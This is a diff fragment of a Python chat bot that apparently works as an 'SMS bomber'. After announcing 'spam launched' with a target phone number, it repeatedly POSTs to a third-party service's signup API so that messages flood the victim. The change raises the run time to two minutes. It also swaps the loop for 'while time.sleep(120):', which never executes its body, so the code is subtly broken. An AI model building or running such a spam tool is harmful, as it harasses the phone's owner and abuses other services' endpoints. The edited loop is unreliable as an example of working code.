@@ -107,10 +107,9 @@ try:
                         i = ca.read()
                         i = int(i)
                     write_message(user, '💣 Спам запущен!')
-                    write_message(user, "Номер: " f'{userr}' "\nВремя: 30 сек!")
+                    write_message(user, "Номер: " f'{userr}' "\nВремя: 2 минуты!")
 
-                    while 2 > o:
-                        o += 1
+                    while time.sleep(120):
                         try:
                             requests.post(
                                 "https://api.delitime.ru/api/v2/signup",
